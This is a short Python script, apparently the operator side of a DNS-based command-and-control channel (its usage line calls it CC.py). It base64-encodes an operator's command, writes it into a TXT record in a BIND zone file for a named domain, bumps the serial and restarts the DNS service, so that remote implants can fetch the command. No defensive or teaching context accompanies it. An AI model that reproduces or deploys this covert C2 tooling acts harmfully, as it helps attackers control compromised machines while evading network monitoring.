import sys
import base64
import datetime
import subprocess


zone_file_path = "/etc/bind/db.connect.menorraitdev.net"

def update_zone_file(command):
   
    encoded_command = base64.b64encode(command.encode()).decode()

    
    with open(zone_file_path, "r") as file:
        lines = file.readlines()

   
    for i, line in enumerate(lines):
        if "Serial" in line:
        
            new_serial = datetime.datetime.now().strftime("%Y%m%d%H")
            lines[i] = f"                          {new_serial} ; Serial\n"

    
    for i, line in enumerate(lines):
        if "command  IN  TXT" in line:
            lines[i] = f'command  IN  TXT  "{encoded_command}"\n'

  
    with open(zone_file_path, "w") as file:
        file.writelines(lines)

   
    subprocess.run(["sudo", "systemctl", "restart", "bind9"], check=True)
    print("Updated zone file and restarted DNS service.")

if __name__ == "__main__":
  
    if len(sys.argv) < 3 or sys.argv[1] != "-command":
        print("Usage: python3 CC.py -command <your_command>")
        sys.exit(1)

    
    command = sys.argv[2]
    update_zone_file(command)
